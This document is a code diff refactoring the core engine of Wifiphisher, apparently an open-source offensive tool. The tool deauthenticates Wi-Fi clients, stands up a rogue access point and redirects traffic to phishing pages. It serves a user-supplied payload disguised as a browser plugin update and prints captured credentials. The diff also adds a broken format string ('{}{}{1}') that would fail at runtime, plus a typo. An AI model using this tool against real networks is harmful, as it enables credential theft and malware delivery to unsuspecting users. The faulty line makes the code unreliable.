@@ -14,7 +14,13 @@ import curses
 import signal
 from threading import Thread
 from shutil import copyfile
-from wifiphisher.common.constants import *
+from .common.constants import (
+    COLOR_WHITE, COLOR_GREEN, COLOR_RED, COLOR_TAN, COLOR_ORANGE,
+    INTERFERING_PROCS, CHANNEL, PHISHING_PAGES_DIR, LURE10_EXTENSION,
+    HANDSHAKE_VALIDATE_EXTENSION, WPSPBC, KNOWN_BEACONS_EXTENSION,
+    ROGUEHOSTAPDINFO, PORT, SSL_PORT, LOGGING_CONFIG, LOG_FILEPATH,
+    MAC_PREFIX_FILE, DEAUTH_EXTENSION, DEVELOPMENT_VERSION, DEV_NULL, WEBSITE,
+    NEW_YEAR, BIRTHDAY, DEFAULT_EXTENSIONS, NETWORK_GW_IP)
 import wifiphisher.common.extensions as extensions
 import wifiphisher.common.phishingpage as phishingpage
 import wifiphisher.common.phishinghttp as phishinghttp
@@ -181,7 +187,10 @@ def set_ip_fwd():
     """
     Set kernel variables.
     """
-    subprocess.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'], stdout=DN, stderr=subprocess.PIPE)
+    subprocess.Popen(
+        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+        stdout=DEV_NULL,
+        stderr=subprocess.PIPE)
 
 
 def set_route_localnet():
@@ -190,7 +199,7 @@ def set_route_localnet():
     """
     subprocess.Popen(
         ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
-        stdout=DN,
+        stdout=DEV_NULL,
         stderr=subprocess.PIPE)
 
 
@@ -208,20 +217,20 @@ def kill_interfering_procs():
         subprocess.Popen(
             ['service', 'network-manager', 'stop'],
             stdout=subprocess.PIPE,
-            stderr=DN)
+            stderr=DEV_NULL)
         subprocess.Popen(
             ['service', 'NetworkManager', 'stop'],
             stdout=subprocess.PIPE,
-            stderr=DN)
+            stderr=DEV_NULL)
         subprocess.Popen(
             ['service', 'avahi-daemon', 'stop'],
             stdout=subprocess.PIPE,
-            stderr=DN)
+            stderr=DEV_NULL)
     except OSError:
         pass
 
     # Kill any possible programs that may interfere with the wireless card
-    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
     output = proc.communicate()[0]
     # total processes in the system
     sys_procs = output.splitlines()
@@ -231,8 +240,8 @@ def kill_interfering_procs():
             # kill all the processes name equal to interfering_proc
             if interfering_proc in proc:
                 pid = int(proc.split(None, 1)[0])
-                print('[' + G + '+' + W + "] Sending SIGKILL to " +
-                      interfering_proc)
+                print("[{}+{}] Sending SIGKILL to {}".format(
+                    COLOR_GREEN, COLOR_WHITE, interfering_proc))
                 os.kill(pid, signal.SIGKILL)
 
 
@@ -247,13 +256,15 @@ class WifiphisherEngine:
         self.opmode = opmode.OpMode()
 
     def stop(self):
-        if DEV:
-            print("[" + G + "+" + W + "] Show your support!")
-            print("[" + G + "+" + W +
-                  "] Follow us: https://twitter.com/wifiphisher")
-            print("[" + G + "+" + W +
-                  "] Like us: https://www.facebook.com/Wifiphisher")
-        print("[" + G + "+" + W + "] Captured credentials:")
+        if DEVELOPMENT_VERSION:
+            print("[{}+{}] Show your support!".format(COLOR_GREEN,
+                                                      COLOR_WHITE))
+            print("[{}+{}] Follow us: https://twitter.com/wifiphisher".format(
+                COLOR_GREEN, COLOR_WHITE))
+            print(
+                "[{}+{}] Like us: https://www.facebook.com/Wifiphisher".format(
+                    COLOR_GREEN, COLOR_WHITE))
+        print("[{}+{}] Captured credentials:".format(COLOR_GREEN, COLOR_WHITE))
         for cred in phishinghttp.creds:
             logger.info("Creds: %s", cred)
             print(cred)
@@ -271,7 +282,7 @@ class WifiphisherEngine:
         if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
             os.remove('/tmp/wifiphisher-webserver.tmp')
 
-        print('[' + R + '!' + W + '] Closing')
+        print("[{}!{}] Colosing".format(COLOR_RED, COLOR_WHITE))
         sys.exit(0)
 
     def try_change_mac(self, iface_name, mac_address=None):
@@ -291,14 +302,15 @@ class WifiphisherEngine:
             else:
                 self.network_manager.set_interface_mac_random(iface_name)
         except interfaces.InvalidMacAddressError as err:
-            print("[{0}!{1}] {2}").format(R, W, err)
+            print("[{0}!{1}] {2}".format(COLOR_RED, COLOR_WHITE, err))
 
     def start(self):
 
         # First of - are you root?
         if os.geteuid():
             logger.error("Non root user detected")
-            sys.exit('[' + R + '-' + W + '] Please run as root')
+            sys.exit('[' + COLOR_RED + '-' + COLOR_WHITE +
+                     '] Please run as root')
 
         # Parse args
         global args, APs
@@ -356,7 +368,8 @@ class WifiphisherEngine:
                 print(
                     "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                     "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
-                    "rogue Access Point").format(G, W, mon_iface, ap_iface)
+                    "rogue Access Point".format(COLOR_GREEN, COLOR_WHITE,
+                                                mon_iface, ap_iface))
 
                 # randomize the mac addresses
                 if not args.no_mac_randomization:
@@ -386,7 +399,8 @@ class WifiphisherEngine:
 
                 print(
                     "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
-                    "rogue Access Point").format(G, W, ap_iface)
+                    "rogue Access Point".format(COLOR_GREEN, COLOR_WHITE,
+                                                ap_iface))
                 logger.info("Selecting {} interface for rouge access point"
                             .format(ap_iface))
 
@@ -401,7 +415,7 @@ class WifiphisherEngine:
                 interfaces.InterfaceCantBeFoundError,
                 interfaces.InterfaceManagedByNetworkManagerError) as err:
             logging.exception("The following error has occurred:")
-            print("[{0}!{1}] {2}").format(R, W, err)
+            print("[{0}!{1}] {2}".format(COLOR_RED, COLOR_WHITE, err))
 
             time.sleep(1)
             self.stop()
@@ -415,14 +429,14 @@ class WifiphisherEngine:
             logger.info("Changing {} MAC address to {}".format(
                 ap_iface, rogue_ap_mac))
             print("[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(
-                G, W, ap_iface, rogue_ap_mac))
+                COLOR_GREEN, COLOR_WHITE, ap_iface, rogue_ap_mac))
 
             if self.opmode.extensions_enabled():
                 mon_mac = self.network_manager.get_interface_mac(mon_iface)
                 logger.info("Changing {} MAC address to {}".format(
                     mon_iface, mon_mac))
                 print("[{0}+{1}] Changing {2} MAC addr to {3}".format(
-                    G, W, mon_iface, mon_mac))
+                    COLOR_GREEN, COLOR_WHITE, mon_iface, mon_mac))
 
         if self.opmode.internet_sharing_enabled():
             self.fw.nat(ap_iface, args.internetinterface)
@@ -431,8 +445,8 @@ class WifiphisherEngine:
             self.fw.redirect_requests_localhost()
         set_route_localnet()
 
-        print('[' + T + '*' + W +
-              '] Cleared leases, started DHCP, set up iptables')
+        print("[{}*{}] Cleared leases, started DHCP, set up iptables".format(
+            COLOR_TAN, COLOR_WHITE))
         time.sleep(1)
 
         if args.essid:
@@ -469,8 +483,8 @@ class WifiphisherEngine:
                                                 self.template_manager)
         logger.info("Selecting {} template".format(
             template.get_display_name()))
-        print("[" + G + "+" + W + "] Selecting " +
-              template.get_display_name() + " template")
+        print("[{}+{}] Selecting {} template".format(
+            COLOR_GREEN, COLOR_WHITE, template.get_display_name()))
 
         # payload selection for browser plugin update
         if template.has_payload():
@@ -479,19 +493,21 @@ class WifiphisherEngine:
             while not payload_path or not os.path.isfile(payload_path):
                 # get payload path
                 payload_path = raw_input(
-                    "[" + G + "+" + W + "] Enter the [" + G + "full path" + W +
+                    "[" + COLOR_GREEN + "+" + COLOR_WHITE + "] Enter the [" +
+                    COLOR_GREEN + "full path" + COLOR_WHITE +
                     "] to the payload you wish to serve: ")
                 if not os.path.isfile(payload_path):
-                    print('[' + R + '-' + W + '] Invalid file path!')
-            print('[' + T + '*' + W + '] Using ' + G + payload_path + W +
-                  ' as payload ')
+                    print("[{}-{}] Invalid file path!".format(
+                        COLOR_RED, COLOR_WHITE))
+            print("[{}*{}] Using {}{}{1} as payload".format(
+                COLOR_TAN, COLOR_WHITE, COLOR_GREEN, payload_path))
             template.update_payload_path(os.path.basename(payload_path))
             copyfile(payload_path,
                      PHISHING_PAGES_DIR + template.get_payload_path())
 
-        APs_context = []
+        ap_context = []
         for i in APs:
-            APs_context.append({
+            ap_context.append({
                 'channel':
                 APs[i][0] or "",
                 'essid':
@@ -502,7 +518,7 @@ class WifiphisherEngine:
                 self.mac_matcher.get_vendor_name(APs[i][2]) or ""
             })
 
-        template.merge_context({'APs': APs_context})
+        template.merge_context({'APs': ap_context})
 
         # only get logo path if MAC address is present
         ap_logo_path = False
@@ -539,9 +555,9 @@ class WifiphisherEngine:
         self.access_point.set_channel(channel)
         self.access_point.set_essid(essid)
         if args.force_hostapd:
-            print('[' + T + '*' + W +
-                  '] Using hostapd instead of roguehostapd.'
-                  " Many significant features will be turned off.")
+            print("[{}*{}] Using hostapd instead of roguehostapd."
+                  " Many significant features will be turned off.".format(
+                      COLOR_TAN, COLOR_WHITE))
             self.access_point.enable_system_hostapd()
         if args.wpspbc_assoc_interface:
             wps_mac = self.network_manager.get_interface_mac(
@@ -551,7 +567,8 @@ class WifiphisherEngine:
             self.access_point.set_psk(args.presharedkey)
         if self.opmode.internet_sharing_enabled():
             self.access_point.set_internet_interface(args.internetinterface)
-        print('[' + T + '*' + W + '] Starting the fake access point...')
+        print("[{}*{}] Starting the fake access point.".format(
+            COLOR_TAN, COLOR_WHITE))
         try:
             self.access_point.start()
             self.access_point.start_dhcp_dns()
@@ -569,7 +586,7 @@ class WifiphisherEngine:
                 'target_ap_logo_path': ap_logo_path or "",
                 'rogue_ap_mac': rogue_ap_mac,
                 'roguehostapd': self.access_point.hostapd_object,
-                'APs': APs_context,
+                'APs': ap_context,
                 'args': args
             }
 
@@ -594,11 +611,10 @@ class WifiphisherEngine:
         # With configured DHCP, we may now start the web server
         if not self.opmode.internet_sharing_enabled():
             # Start HTTP server in a background thread
-            print('[' + T + '*' + W +
-                  '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " +
-                  str(SSL_PORT))
+            print("[{}*{}] Starting HTTP/HTTPS server at ports {}, {}".format(
+                COLOR_TAN, COLOR_WHITE, PORT, SSL_PORT))
             webserver = Thread(
-                target=phishinghttp.runHTTPServer,
+                target=phishinghttp.run_http_server,
                 args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
             webserver.daemon = True
             webserver.start()
@@ -608,7 +624,6 @@ class WifiphisherEngine:
         # We no longer need mac_matcher
         self.mac_matcher.unbind()
 
-        clients_APs = []
         APs = []
 
         # Main loop.
@@ -625,17 +640,19 @@ class WifiphisherEngine:
 def run():
     try:
         today = time.strftime("%Y-%m-%d %H:%M")
-        print('[' + T + '*' + W + '] Starting Wifiphisher %s ( %s ) at %s' %
-              (VERSION, WEBSITE, today))
+        print("[{}*{}] Starting Wifiphisher {} ({}) at {}".format(
+            COLOR_TAN, COLOR_WHITE, VERSION, WEBSITE, today))
         if BIRTHDAY in today:
-            print('[' + T + '*' + W +
-                  '] Wifiphisher was first released on this day in 2015! '
-                  'Happy birthday!')
+            print(
+                "[{}*{}] Wifiphisher was first released on this day in 2015! Happy birthday!".
+                format(COLOR_TAN, COLOR_WHITE))
         if NEW_YEAR in today:
-            print('[' + T + '*' + W + '] Happy new year!')
+            print("[{}*{}] Happy new year!".format(COLOR_TAN, COLOR_WHITE))
         engine = WifiphisherEngine()
         engine.start()
     except KeyboardInterrupt:
-        print(R + '\n (^C)' + O + ' interrupted\n' + W)
+        print("{}\n (^C){} interrupted{}\n".format(COLOR_RED, COLOR_ORANGE,
+                                                   COLOR_WHITE))
     except EOFError:
-        print(R + '\n (^D)' + O + ' interrupted\n' + W)
+        print("{}\n (^D){} interrupted{}\n".format(COLOR_RED, COLOR_ORANGE,
+                                                   COLOR_WHITE))
